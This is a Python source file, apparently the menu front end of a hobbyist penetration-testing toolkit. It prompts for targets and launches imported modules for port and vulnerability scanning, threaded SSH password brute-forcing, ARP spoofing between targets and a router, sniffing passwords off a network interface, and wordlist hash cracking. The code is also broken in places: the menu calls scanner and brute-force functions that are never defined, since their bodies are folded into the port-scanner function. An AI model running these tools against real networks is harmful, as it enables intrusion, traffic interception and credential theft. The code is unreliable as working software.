import threading
import time
from os import path

from termcolor import colored
import scapy
from termcolor import colored, cprint

import passSniffer
import portScanner
import portScanner_vulscan as vul
import sshbrutethreaded as ssh
from PasswordCracker import crack
from arpspoofer2 import get_mac_address, spoof
from passSniffer import sniff, pkt_parser


def portScannerf():
    print('_____PORTSCANNER____')
    try:
        pr, tr, tmr = False, False, False
        time, ports, targets = str(), str(), str()
        while not tr:  # Keep repeating the question until user inputs are valid
            targets = input('[+] Enter Target/s To Scan(split multiple targets with): ').strip(' ')

            for ip_add in targets.split(','):  # for every ip address in the inputted targets target
                if portScanner.check_ip(ip_add.strip(' '))[1]:  # check if its a valid ip
                    tr = True
                else:  # if not print the error and ask the question again, by breaking the loop
                    print(ip_add + ' not an ip address')
                    tr = False
                    break

        while not pr:  # port is not right i.e pr
            ports = input('[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ').strip(
                ' ')
            if ',' in ports:
                for port in ports.split(','):
                    if port.isdigit():
                        pr = True
                    else:
                        pr = False
                        print('invalid port number\nTry Again')
                        break  # ends the iteration once an error is found
            elif '-' in ports:
                for port in ports.split('-'):
                    if port.isdigit():
                        pr = True
                    else:
                        pr = False
                        print('invalid port number specified\nTry Again')
                        break  # break from teh for loop
            else:
                if ports.isdigit():
                    pr = True
                else:
                    pr = False
                    print('invalid port number\n\nTry Again')

        while not tmr:
            time = input('[+] Enter timeout time in seconds i.e 5 = fives seconds ').strip(' ')
            if time.isdigit():
                tmr = True
            else:
                print('invalid time \nTry Again')
                tmr = False

        value = 0
        portsArray = list()
        # if a range
        if '-' in ports:
            for port in ports.split('-'):
                portsArray.append(int(port))
                # makes sure the range is in order
                portsArray.sort()
        else:
            for port in ports.split(','):
                print(port)
                portsArray.append(int(port.strip(' ')))
            value = 1

        print("The value is: " + str(value))

        if ',' in targets:
            print('There are multiple targets: "," detected')
            for ip_add in targets.split(','):
                if value != 1:
                    portScanner.scanRange(ip_add, portsArray[0], portsArray[1], time)
                else:
                    portScanner.scan1(ip_add, portsArray, time)

        else:
            print('There is a single target: no "," detected')
            if value != 1:
                print('Range')
                portScanner.scanRange(targets.strip(' '), portsArray[0], portsArray[1], time)
            else:
                print('Single')
                print(targets, portsArray, time)
                portScanner.scan1(targets, portsArray, time)
    except KeyboardInterrupt:
        print('\n\nbye.')
        exit(0)


    try:
        print('_____VulnerabiltyScanner____')
        targets = input('[+] Enter Target/s To Scan(split multiple targets with ,): ')
        ports = input('[+] Enter Port/s To Scan(multiple ports with - for range or , for specific ports): ')
        vul_file = input('[+] * Enter Path To The File With Vulnerable Softwares: ')
        timeout_time = int(input('[+] Enter timeout time in seconds '))
        value = int(0)
        portsArray = []

        # if it not a range i.e specific port(s)
        if '-' not in ports:
            for port in ports.split(','):
                portsArray.append(int(port.strip(' ')))
                value = 1
        else:
            for port in ports.split('-'):
                portsArray.append(int(port.strip(' ')))
                # makes sure the range is in order
                portsArray.sort()

        if ',' in targets:
            for ip_add in targets.split(','):
                if value != 1:
                    vul.scan(ip_add, portsArray[0], portsArray[1], timeout_time)
                else:
                    vul.scan1(ip_add, portsArray, timeout_time)
        else:
            # if its not a specific target or targets i.e a range
            if value != 1:
                vul.scan(targets.strip(' '), portsArray[0], portsArray[1], timeout_time)
            else:
                vul.scan1(targets.strip(' '), portsArray, timeout_time)
        try:
            with open(vul_file, 'r') as file:
                count = 0
                for banner in vul.banners:
                    file.seek(0)
                    for line in file.readlines():
                        if line.strip() in banner:
                            print('[!!] VULNERABLE BANNER: "' + banner + '" ON PORT: ' + str(
                                vul.open_ports[count]))
                    count += 1
        except FileNotFoundError:
            print("File not accessible")
        finally:
            file.close()
    except KeyboardInterrupt:
        print('bye')
        exit(0)


    try:
        print('_____SSH BRUTEFORCER____')
        host = input('[+] Target Address: ')
        username = input('[+] SSH Username: ')
        input_file = input('[+] Passwords File: ')
        print('\n')

        def file(passwordfile):
            f = None
            try:  # check if the file exist
                f = open(passwordfile, 'r')
            except IOError:
                print("File not accessible")
            else:  # if the file exists
                print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + '* * *')
                with f as passwords:
                    for line in passwords.readlines():
                        if ssh.stop_flag == 1:
                            t.join()
                            exit()
                        password = line.strip()
                        t = threading.Thread(target=ssh.ssh_connect, args=(host, username, password,))
                        t.start()
                        time.sleep(0.5)
            finally:
                f.close()

        file(input_file)
    except KeyboardInterrupt:
        print('bye.')
        exit(0)


def passwordCracker():
    try:
        hash_to_decrypt = str(input(colored('[+] Enter hash to decrypt or hashes using ",": ', color='grey')))
        fr, thr = False, False

        while not thr:
            print(colored('[+] Choose a Hash to decrypt:', color='grey', attrs=list['bold']))
            type_of_hash = str(
                input(colored('[1] SHA-1  ', on_color='on_green') + colored('[2]MD-5  ', on_color='on_blue')
                      + colored('[3]SHA-256  ', on_color='on_cyan'))
            ).strip(' ')
            if type_of_hash == "1" or type_of_hash == "2" or type_of_hash == "3":
                thr = True
                if type_of_hash == "1":
                    type_of_hash = "sha1"
                elif type_of_hash == "2":
                    type_of_hash = "md5"
                else:
                    type_of_hash = "sha256"
            else:
                pass

        while not fr:  # if file is not right
            file_path = str(input(colored('[+] Enter path to the password file: ', color='grey')))
            if not path.isfile(file_path):
                print(colored('File not found\n', 'red') + colored('Try again', color='red', attrs=['bold']))
            else:
                fr = True

    except:
        print(colored("0_o Error", 'red', attrs=['bold']))
    else:
        for each_hash in hash_to_decrypt.split(','):
            crack(type_of_hash, file_path, each_hash)


def arpSpoofer():
    try:
        tip, rip = False, False
        target_ip, router_ip = str(), str()
        list_of_target_ips = list()
        while not tip:  # if theres a error in the target ip
            target_ip = input('[+] Enter Target ip): ').strip(' ')
            if ',' in target_ip:
                for ip_add in target_ip.split(','):
                    if portScanner.check_ip(ip_add) == ip_add:  # check if its a valid ip
                        tip = True
                    else:  # if not print ask the question again, by breaking the loop
                        print(ip_add + 'not an ip address')
                        tip = False
                        break
            if ',' not in target_ip:
                if portScanner.check_ip(target_ip) == target_ip:  # check if its a valid ip
                    tip = True
                else:  # if not print the error and ask the question again, by breaking the loop
                    print(target_ip + 'not an ip address')
                    tip = False

        for ips in target_ip.split(','):  # places targets in this array
            list_of_target_ips.append(ips)
        print(list_of_target_ips)
        while not rip:  # if theres a error in the target ip
            router_ip = input('[+] Enter Router ip): ').strip(' ')
            if portScanner.check_ip(router_ip) == router_ip:  # check if its a valid ip
                rip = True
            else:  # if not print the error and ask the question again, by breaking the loop
                print(router_ip + 'not an ip address')
                print('try again\n')
                rip = False
    except KeyboardInterrupt:
        print('\nClosing ARP Spoofer.')
        exit(0)
    else:
        try:
            list_of_target_macs = list()
            for ip in list_of_target_ips:
                list_of_target_macs.append(str(get_mac_address(ip)))

            router_mac = str(get_mac_address(router_ip))
            print(router_mac)
            print(list_of_target_macs)
        except IndexError:
            print("Mac Address of " + ip + " not found")
        except KeyboardInterrupt:
            print('bye')
        except:
            print('error connecting')
        else:
            try:
                while True:
                    for x in range(len(list_of_target_macs)):
                        print(x)
                        spoof(router_ip, list_of_target_ips[x], router_mac, list_of_target_macs[x])
                        time.sleep(
                            round(2 / len(list_of_target_macs), 2))  # ensures each ip is spoofed every to seconds

            except KeyboardInterrupt:
                print('Closing ARP Spoofer.')
                exit(0)


def passwordSniffer():
    print(colored('_____PASSWORD SNIFFER____', 'on_yellow'))
    print("\n")

    ir = True
    while ir:
        interface = input("interface i.e en0 or ethernet: ")  # make its user input
        try:
            sniff(iface=interface, prn=pkt_parser, store=0)
        except KeyboardInterrupt:
            print('Exiting')
            exit(0)
        except scapy.error.Scapy_Exception as e:
            if 'root' in str(e):
                cprint(colored("WARNING ", "red", attrs=['bold']) + colored('Not running application as Sudo!!', 'red'))
            elif 'BIOCSETIF' in str(e):
                cprint(colored('Not a valid interface interface', 'red'))
            else:
                print(str(e))


if __name__ == '__main__':
    try:
        print('\n')
        print(colored("Welcome to PENE TEST", color="grey", on_color="on_cyan", attrs=['bold', 'underline']))
        print('\n')
        opr = False
        while not opr:  # if input is invalid keep asking the question
            print(colored('[1] PortScanner  ', on_color='on_green') +
                   colored("[2] Vulnerability Scanner", on_color='on_cyan') +
                   colored("[3] SSH Bruteforce  ", on_color='on_magenta')
                   )
            print(colored("[4] ARPSpoofer   ", on_color='on_blue') +
                   colored("[5] Password Sniffer     ", on_color='on_red') +
                   colored("[6] Password Cracker", on_color='on_grey')
                   )
            option = input(colored("\nChoose a number: ", attrs=["bold"])).strip(' ')

            if option == '1':
                portScannerf()
            elif option == '2':
                vulScan()
            elif option == '3':
                sshBruteForcer()
            elif option == '4':
                arpSpoofer()
            elif option == '5':
                passwordSniffer()
            elif option == '6':
                passwordCracker()
            else:
                print(colored('0_o Input not recognised\n', color='red', attrs=['bold']))
    except KeyboardInterrupt:
        print('\nBye.')

